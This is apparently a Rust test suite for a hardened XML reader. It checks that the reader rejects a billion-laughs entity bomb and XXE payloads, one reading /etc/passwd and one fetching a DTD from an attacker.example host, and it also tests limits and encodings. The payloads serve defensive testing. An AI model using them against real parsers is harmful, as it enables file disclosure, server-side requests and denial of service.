//! Adversarial tests for the secure XML reader.

use super::*;

fn check(src: &str) -> Result<u64, XmlError> {
    validate_document(src, XmlLimits::default())
}

#[test]
fn billion_laughs_is_refused_at_the_doctype() {
    let bomb = r#"<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol9 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol9;</lolz>"#;
    assert_eq!(check(bomb), Err(XmlError::DoctypeForbidden));
}

#[test]
fn xxe_is_refused() {
    let xxe =
        r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>"#;
    assert_eq!(check(xxe), Err(XmlError::DoctypeForbidden));
    let ssrf = r#"<!DOCTYPE r SYSTEM "http://attacker.example/evil.dtd"><r/>"#;
    assert_eq!(check(ssrf), Err(XmlError::DoctypeForbidden));
}

#[test]
fn undeclared_entities_are_refused_even_without_doctype() {
    assert!(matches!(check("<r>&evil;</r>"), Err(XmlError::UndefinedEntity(_))));
    assert!(check(r#"<r a="&evil;"/>"#).is_err());
}

#[test]
fn predefined_entities_and_char_refs_are_fine() {
    let src = r#"<r a="&lt;&#x41;">&amp;&lt;&gt;&apos;&quot;&#1055;&#x420;</r>"#;
    assert!(check(src).is_ok());
    let mut r = SecureXmlReader::new(src, XmlLimits::default()).unwrap();
    let mut text = String::new();
    while let Some(item) = r.next_item().unwrap() {
        push_text(&item.event, &mut text);
        if let Event::Start(e) = &item.event {
            assert_eq!(attr(e, "a").as_deref(), Some("<A"));
        }
    }
    assert_eq!(text, "&<>'\"ПР");
}

#[test]
fn invalid_char_ref_is_refused() {
    assert!(check("<r>&#0;</r>").is_err());
    assert!(check("<r>&#xD800;</r>").is_err());
}

#[test]
fn depth_64_is_allowed_65_is_not() {
    let nest = |n: usize| format!("{}{}", "<a>".repeat(n), "</a>".repeat(n));
    assert!(check(&nest(64)).is_ok());
    assert_eq!(check(&nest(65)), Err(XmlError::DepthExceeded(64)));
    // An empty element at depth 65 counts too.
    let deep_empty = format!("{}<b/>{}", "<a>".repeat(64), "</a>".repeat(64));
    assert_eq!(check(&deep_empty), Err(XmlError::DepthExceeded(64)));
}

#[test]
fn attribute_limits_and_duplicates() {
    let many: String = (0..600).map(|i| format!(" a{i}=\"1\"")).collect();
    assert_eq!(check(&format!("<r{many}/>")), Err(XmlError::TooManyAttributes(512)));
    assert!(matches!(check(r#"<r a="1" a="2"/>"#), Err(XmlError::Malformed(_))));
}

#[test]
fn single_root_rule() {
    assert_eq!(check("<a/><b/>"), Err(XmlError::ContentAfterRoot));
    assert_eq!(check("<a></a><b/>"), Err(XmlError::ContentAfterRoot));
    assert_eq!(check("<a/>trailing"), Err(XmlError::ContentAfterRoot));
    assert_eq!(check("  "), Err(XmlError::NoRoot));
    assert!(check("<?xml version=\"1.0\"?>\n<!-- c --><a/>\n<!-- c -->\n").is_ok());
}

#[test]
fn mismatched_tags_are_malformed() {
    assert!(matches!(check("<a><b></a></b>"), Err(XmlError::Malformed(_))));
    assert!(matches!(check("<a>"), Err(XmlError::Malformed(_))));
}

#[test]
fn event_limit() {
    let src = format!("<r>{}</r>", "<x/>".repeat(100));
    let limits = XmlLimits { max_events: 50, ..XmlLimits::default() };
    assert_eq!(validate_document(&src, limits), Err(XmlError::TooManyEvents(50)));
}

#[test]
fn encodings() {
    let limits = XmlLimits::default();
    let utf8_bom = b"\xEF\xBB\xBF<r>\xD0\x9F</r>";
    assert_eq!(decode_xml_bytes(utf8_bom, &limits).unwrap(), "<r>П</r>");
    let mut utf16le = vec![0xFF, 0xFE];
    for u in "<r>П</r>".encode_utf16() {
        utf16le.extend_from_slice(&u.to_le_bytes());
    }
    assert_eq!(decode_xml_bytes(&utf16le, &limits).unwrap(), "<r>П</r>");
    let mut utf16be = vec![0xFE, 0xFF];
    for u in "<r/>".encode_utf16() {
        utf16be.extend_from_slice(&u.to_be_bytes());
    }
    assert_eq!(decode_xml_bytes(&utf16be, &limits).unwrap(), "<r/>");
    assert!(decode_xml_bytes(b"<r>\xC3\x28</r>", &limits).is_err());
    assert!(decode_xml_bytes(&[0xFF, 0xFE, 0x00], &limits).is_err());
}

#[test]
fn spans_cover_the_whole_input() {
    let src =
        "<?xml version=\"1.0\"?>\n<a x=\"1\"><b>t&amp;u</b><![CDATA[c]]><!--k--><?pi d?></a>\n";
    let mut r = SecureXmlReader::new(src, XmlLimits::default()).unwrap();
    let mut rebuilt = String::new();
    while let Some(item) = r.next_item().unwrap() {
        rebuilt.push_str(src.get(item.span.clone()).unwrap());
    }
    assert_eq!(rebuilt, src);
}

#[test]
fn local_names_and_attrs() {
    let src = r#"<w:r xmlns:w="urn:w" w:val="X" r:id="rId1"/>"#;
    let mut r = SecureXmlReader::new(src, XmlLimits::default()).unwrap();
    let item = r.next_item().unwrap().unwrap();
    let Event::Empty(e) = &item.event else { panic!("expected empty element") };
    assert_eq!(local_name(e), "r");
    assert_eq!(attr(e, "val").as_deref(), Some("X"));
    assert_eq!(attr_q(e, "r:id").as_deref(), Some("rId1"));
    assert_eq!(attrs(e).len(), 3);
    assert_eq!(escape("<a&'\">"), "&lt;a&amp;&apos;&quot;&gt;");
}
